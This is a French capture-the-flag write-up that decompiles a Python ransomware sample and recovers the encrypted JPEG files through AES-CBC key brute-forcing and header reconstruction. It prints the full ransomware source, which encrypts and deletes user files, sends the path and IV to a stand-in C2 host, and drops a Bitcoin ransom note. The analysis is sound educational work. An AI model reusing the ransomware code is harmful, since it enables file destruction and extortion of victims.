---
weight: 4
title: "[Santhacklaus 2019] - Jacques ! Au secours !"
date: 2019-12-22T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: ""
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["santhacklaus", "h25", "mathis hammel", "cryptography", "file format", "aes", "python"]
categories: ["Writeups"]

lightgallery: true
---

> One of our VIP clients, who wishes to remain anonymous, has apparently been hacked and all their important documents are now corrupted.
> Can you help us recover the files? We found a strange piece of software that might have caused all of this.
> MD5 of the file : ccaab91b06fc9a77f3b98d2b9164df8e
> Fichiers: http://cloud.id-iot.team/s/e2ZgLdHKwMoFQ8x

## Etat des lieux

Cette épreuve commence donc avec une archive zip contenant plusieurs fichiers:

![](/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_b0b0fa8588a7c488222e5715d5e4fc93.png)

Le fichier "READ_THIS.txt" contient un message charmant:

> We have hacked all your files. Buy 1 BTC and contact us at hacked@virus.com

Le fichier "virus.cpython-37.pyc" rappelle un fichier de python compilé. Malheureusement [pycdc](https://github.com/zrax/pycdc) ne décompile pas correctement le "virus". Heureusement qu'il existe des outils en ligne pour tout et n'importe quoi:

> https://python-decompiler.com/

Le résultat est vraiment mieux, après corrections de quelques petites choses, on obtient le code suivant:

```python
#!/usr/bin/python3
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib, getpass, os, requests
TARGET_DIR = 'C:\\Users'
C2_URL = 'https://c2.virus.com/'
TARGETS = [b'Scott Farquhar', b'Lei Jun', b'Reid Hoffman', b'Zhou Qunfei', b'Jeff Bezos', b'Shiv Nadar', b'Simon Xie', b'Ma Huateng', b'Ralph Dommermuth', b'Barry Lam', b'Nathan Blecharczyk', b'Judy Faulkner', b'William Ding', b'Scott Cook', b'Gordon Moore', b'Marc Benioff', b'Michael Dell', b'Yusaku Maezawa', b'Yuri Milner', b'Bobby Murphy', b'Larry Page', b'Henry Samueli', b'Jack Ma', b'Jen-Hsun Huang', b'Jay Y. Lee', b'Joseph Tsai', b'Dietmar Hopp', b'Henry Nicholas, III.', b'Dustin Moskovitz', b'Mike Cannon-Brookes', b'Robert Miller', b'Bill Gates', b'Garrett Camp', b'Lin Xiucheng', b'Gil Shwed', b'Sergey Brin', b'Rishi Shah', b'Denise Coates', b'Zhang Fan', b'Michael Moritz', b'Robin Li', b'Andreas von Bechtolsheim', b'Brian Acton', b'Sean Parker', b'John Doerr', b'David Cheriton', b'Brian Chesky', b'Wang Laisheng', b'Jan Koum', b'Jack Sheerack', b'Terry Gou', b'Adam Neumann', b'James Goodnight', b'Larry Ellison', b'Wang Laichun', b'Masayoshi Son', b'Min Kao', b'Hiroshi Mikitani', b'Lee Kun-Hee', b'David Sun', b'Mark Scheinberg', b'Yeung Kin-man', b'John Tu', b'Teddy Sagi', b'Frank Wang', b'Robert Pera', b'Eric Schmidt', b'Wang Xing', b'Evan Spiegel', b'Travis Kalanick', b'Steve Ballmer', b'Mark Zuckerberg', b'Jason Chang', b'Lam Wai Ying', b'Romesh T. Wadhwani', b'Liu Qiangdong', b'Jim Breyer', b'Zhang Zhidong', b'Pierre Omidyar', b'Elon Musk', b'David Filo', b'Joe Gebbia', b'Jiang Bin', b'Pan Zhengmin', b'Douglas Leone', b'Hasso Plattner', b'Paul Allen', b'Meg Whitman', b'Azim Premji', b'Fu Liquan', b'Jeff Rothschild', b'John Sall', b'Kim Jung-Ju', b'David Duffield', b'Gabe Newell', b'Scott Lin', b'Eduardo Saverin', b'Jeffrey Skoll', b'Thomas Siebel', b'Kwon Hyuk-Bin']

def get_username():
    return getpass.getuser().encode()


def xorbytes(a, b):
    assert len(a) == len(b)
    res = b''
    for c, d in zip(a, b):
        res += bytes([c ^ d])

    return res


def lock_file(path):
    username = get_username()
    hsh = hashlib.new('md5')
    hsh.update(username)
    key = hsh.digest()
    cip = AES.new(key, 1)
    iv = get_random_bytes(16)
    params = (('target', username), ('path', path), ('iv', iv))
    requests.get(C2_URL, params=params)
    with open(path, 'rb') as (fi):
        with open(path + '.hacked', 'wb') as (fo):
            block = fi.read(16)
            while 1:
                if block:
                    while 1:
                        if len(block) < 16:
                            block += bytes([0])
                        else:
                            break
                    cipherblock = cip.encrypt(xorbytes(block, iv))
                    iv = cipherblock
                    fo.write(cipherblock)
                    block = fi.read(16)
                else:
                    break
    os.unlink(path)


def lock_files():
    username = get_username()
    print(username)
    if username in TARGETS:
        for directory, _, filenames in os.walk(TARGET_DIR):
            for filename in filenames:
                if filename.endswith('.hacked'):
                    continue
                fullpath = os.path.join(directory, filename)
                print('Encrypting', fullpath)
                lock_file(fullpath)

        with open(os.path.join(TARGET_DIR, 'READ_THIS.txt'), 'wb') as (fo):
            fo.write(b'We have hacked all your files. Buy 1 BTC and contact us at hacked@virus.com\n')


if __name__ == '__main__':
    lock_files()
```

Bien plus simple à analyser.

## Analyse du code python

Rien qu'avec les imports, on voit que le malware va faire de l'AES et probablement générer clé / iv de manière aléatoire. Ensuite, les variables globales peuvent interpeler:

* TARGET_DIR: le repertoire à chiffrer;
* C2_URL: l'url du serveur de command and control de l'attaquant, en l'occurence il n'existe pas / plus;
* TARGETS: une ribambelle de noms et prénoms.

La fonction qui va être intéressante est `lock_file(path)`. Les premières lignes vont servir à générer la clé AES:

```python
username = get_username()
hsh = hashlib.new('md5')
hsh.update(username)
key = hsh.digest()
```

La clé est donc le md5 du username. Les deux lignes suivantes servent à initialiser l'AES:

```python
cip = AES.new(key, 1) # AES ECB
iv = get_random_bytes(16)
```

Il faut de l'AES ECB avec comme clé le `md5(username)` et génère un vecteur d'initialisation (IV). Hors, l'AES ECB n'a pas d'IV. 

Les deux lignes suivantes envoient les paramètres AES au serveur de command and control:

```python
params = (('target', username), ('path', path), ('iv', iv))
requests.get(C2_URL, params=params)
```

Bon, et maintenant le vif du sujet: la crypto. On va reprendre cette fonction en ne gardant que l'algo:

```python
'''
génération de la clé
'''
username = get_username()
hsh = hashlib.new('md5')
hsh.update(username)
key = hsh.digest()

'''
init de l'AES
'''
cip = AES.new(key, 1)
iv = get_random_bytes(16)

'''
tambouille
'''
with open(path, 'rb') as (fi):
    with open(path + '.hacked', 'wb') as (fo):
        block = fi.read(16)
        while 1:
            if block:
                while 1:
                    if len(block) < 16:
                        block += bytes([0])
                    else:
                        break
                cipherblock = cip.encrypt(xorbytes(block, iv))
                iv = cipherblock
                fo.write(cipherblock)
                block = fi.read(16)
            else:
                break
```

L'algo "tambouille", rappelle l'AES CBC, utilisant l'IV. A savoir que la différence entre l'AES ECB et CBC est justement ce vecteur d'initialisation. Le schéma suivant représente l'AES CBC lors du chiffrement:

![](/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_enc.png)

On admet donc que c'est de l'AES CBC dont on connait la clé mais pas l'IV. On peut dire qu'on connait la clé, car les usernames utilisées sont présent dans la liste TARGETS, il suffira de bruteforce pour trouver le bon.

## Euréka

Analysons les informations en notre possessions:

* Images JPEG chiffrées
* AES CBC dont on connait la clé mais pas l'IV

Et ci-dessous le schéma de déchiffrement de l'AES CBC:

![](/lib/images/writeups/2019_santhacklaus/jacqueschirac/aes_cbc_dec.png)

Le schéma ci-dessus donne une information vraiment intéressante: si on ne connais pas l'IV, seul le premier block sera illisible, mais tout le reste se base sur la clé.

On peut faire un test très simple:

```python
#!/usr/bin/python3

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib

def md5_fn(a):
    hsh = hashlib.new('md5')
    hsh.update(a)
    return hsh.digest()

def decrypt(key):
    a = AES.new(key, AES.MODE_CBC, b'\x00'*16)
    return a.decrypt(ENC_DATA)

def encrypt(key):
    iv = get_random_bytes(16)
    a = AES.new(key, AES.MODE_CBC, iv)
    return a.encrypt(DATA)

KEY = md5_fn(b'maki')
DATA = b"Coucou j'aime beaucoup les fleurs, surtout quand elle sentent bo" # Oui c'est juste pour que ça fasse un multiple de 16
ENC_DATA = encrypt(KEY)

print(decrypt(KEY))
```

On génère un chiffré d'une string connue avec un IV aléatoire et on déchiffre avec la clé mais un IV fait que de null bytes. Ce snippet retourne:

> b'\xf3fw\xf6\x15MFTq\xbd\xad\x9c\xbd\x06\xad\x83aucoup les fleurs, surtout quand elle sentent bo'

Seul le premier block est illisible. Le second est parfaitement déchiffré.

## Format JPEG

Intéressons nous au format JPEG, pour savoir s'il est possible de reconstruire ce premier block. Prenons 3 images aléatoires sur Google images:

1. http://image.jeuxvideo.com/medias-md/157675/1576752756-4689-card.jpg
2. https://static.lpnt.fr/images/2017/08/07/9591045lpw-9591057-article-jpg_4474173_980x426.jpg
3. https://www.digital.security/fr/sites/default/files/illu-actu/logo_digital-security.jpg

```bash
$ file *.jpg
1576752756-4689-card.jpg:                           JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 768x432, components 3
9591045lpw-9591057-article-jpg_4474173_980x426.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 980x426, components 3
logo_digital-security.jpg:                          JPEG image data, JFIF standard 1.01, resolution (DPI), density 100x100, segment length 16, progressive, precision 8, 440x260, components 3
```

Maintenant regardons les headers de ces 3 images JPEG:

```bash
for i in $(ls *.jpg); do hexdump -C $i|head -n 2 && echo ""; done
```

![](/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_6b952068329f765d15101947309d39ca.png)

Une bonne partie du premier block est identique. En patchant le future fichier déchiffré avec:

> ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 01

Alors il est possible que l'image soit déchiffrée malgrès l'absence de l'IV. Cependant, avant de faire ça, il faut trouver le bon username pour trouver la clé AES.

Pour cela, on sait que le premier bloc déchiffré sera le dernier bloc de la photo. De plus, on sait qu'un fichier JPEG se termine toujours par `\xff\xd9`:

```bash
for i in $(ls *.jpg); do hexdump -C $i|tail -n2 && echo ""; done
```

![](/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_61630fa14d298b3aaebc87e9e622d2e1.png)

## Trouver la clé AES

Sachant ça, on peut supposer que le username utilisé est dans la liste "TARGETS". Le snippet suivant va bruteforce jusqu'à trouver la signature de fin:

```python
#!/usr/bin/python3

from Crypto.Cipher import AES
import hashlib

DATA = open('DCIM-0533.jpg.hacked','rb').read()
TARGETS = [b'Scott Farquhar', b'Lei Jun', b'Reid Hoffman', b'Zhou Qunfei', b'Jeff Bezos', b'Shiv Nadar', b'Simon Xie', b'Ma Huateng', b'Ralph Dommermuth', b'Barry Lam', b'Nathan Blecharczyk', b'Judy Faulkner', b'William Ding', b'Scott Cook', b'Gordon Moore', b'Marc Benioff', b'Michael Dell', b'Yusaku Maezawa', b'Yuri Milner', b'Bobby Murphy', b'Larry Page', b'Henry Samueli', b'Jack Ma', b'Jen-Hsun Huang', b'Jay Y. Lee', b'Joseph Tsai', b'Dietmar Hopp', b'Henry Nicholas, III.', b'Dustin Moskovitz', b'Mike Cannon-Brookes', b'Robert Miller', b'Bill Gates', b'Garrett Camp', b'Lin Xiucheng', b'Gil Shwed', b'Sergey Brin', b'Rishi Shah', b'Denise Coates', b'Zhang Fan', b'Michael Moritz', b'Robin Li', b'Andreas von Bechtolsheim', b'Brian Acton', b'Sean Parker', b'John Doerr', b'David Cheriton', b'Brian Chesky', b'Wang Laisheng', b'Jan Koum', b'Jack Sheerack', b'Terry Gou', b'Adam Neumann', b'James Goodnight', b'Larry Ellison', b'Wang Laichun', b'Masayoshi Son', b'Min Kao', b'Hiroshi Mikitani', b'Lee Kun-Hee', b'David Sun', b'Mark Scheinberg', b'Yeung Kin-man', b'John Tu', b'Teddy Sagi', b'Frank Wang', b'Robert Pera', b'Eric Schmidt', b'Wang Xing', b'Evan Spiegel', b'Travis Kalanick', b'Steve Ballmer', b'Mark Zuckerberg', b'Jason Chang', b'Lam Wai Ying', b'Romesh T. Wadhwani', b'Liu Qiangdong', b'Jim Breyer', b'Zhang Zhidong', b'Pierre Omidyar', b'Elon Musk', b'David Filo', b'Joe Gebbia', b'Jiang Bin', b'Pan Zhengmin', b'Douglas Leone', b'Hasso Plattner', b'Paul Allen', b'Meg Whitman', b'Azim Premji', b'Fu Liquan', b'Jeff Rothschild', b'John Sall', b'Kim Jung-Ju', b'David Duffield', b'Gabe Newell', b'Scott Lin', b'Eduardo Saverin', b'Jeffrey Skoll', b'Thomas Siebel', b'Kwon Hyuk-Bin']

def md5_fn(a):
    hsh = hashlib.new('md5')
    hsh.update(a)
    return hsh.digest()

def decrypt(key):
    a = AES.new(key, AES.MODE_CBC, b'\x00'*16)
    return a.decrypt(DATA)

for i in TARGETS:
    key = md5_fn(i)
    plain = decrypt(key).rstrip(b'\x00')
    if plain.endswith(b'\xff\xd9'):
        print(i)
```

> Jack Sheerack

Le MD5 de ce username est donc la clé.

## Déchiffrer les images

Maintenant qu'on a la clé et qu'on peut potentiellement reconstruire le header d'un JPEG, il ne reste qu'à tester sur une image:

```python
#!/usr/bin/python3

from Crypto.Cipher import AES
import hashlib, binascii

def md5_fn(a):
    hsh = hashlib.new('md5')
    hsh.update(a)
    return hsh.digest()

def decrypt(key):
    a = AES.new(key, AES.MODE_CBC, b'\x00'*16)
    return a.decrypt(DATA)

DATA = open('DCIM-0534.jpg.hacked','rb').read()
KEY = md5_fn(b'Jack Sheerack')

a = binascii.unhexlify('ffd8ffe000104a464946000101000001')

# On va venir patcher les 16 premiers octets avec ceux d'une des images trouvées sur internet
open('clear.jpg','wb').write(a+decrypt(KEY)[16:])
```

Ce qui donne:

![](/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_2a4a5fc45cdf596ee854b9392c637762.png)

## Flag

> SANTA{Jacques_Th3_R1pp3R}